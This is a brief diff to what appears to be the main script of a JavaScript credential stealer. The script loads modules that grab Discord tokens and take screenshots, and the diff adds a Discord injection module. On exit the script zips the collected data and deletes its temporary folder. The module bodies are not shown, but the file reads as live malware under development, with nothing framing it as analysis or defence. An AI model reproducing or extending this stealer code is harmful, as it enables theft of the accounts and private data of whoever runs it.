@@ -17,6 +17,8 @@ require('./functions/grab-discord-token');
 require('./functions/screenshot');
 // require('./functions/fake-error');
 
+require('./functions/discord-injection');
+
 process.on('exit', () => {
   require('./functions/zip');
   sleep(1000).then(() => rmSync(tempFolder, { recursive: true }));
